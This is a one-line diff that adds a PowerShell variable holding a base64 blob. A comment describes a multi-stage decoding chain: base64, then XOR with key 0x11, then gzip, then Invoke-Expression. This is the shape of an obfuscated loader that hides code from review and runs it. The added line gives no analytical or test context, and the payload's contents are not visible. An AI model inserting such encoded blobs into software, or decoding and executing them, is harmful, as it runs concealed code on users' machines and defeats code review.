@@ -1,0 +1,1 @@
+$p='DpoZEbZyRnsT7uJlnEHB2T0+Q0HeOTg4ocPG3jzHJMVavFndPNlYxDpYPD/AXidDRsE8PF9cwxUR85TTYjwRERE='; # xor-key 0x11  # multi-stage: b64 → xor → gz → iex
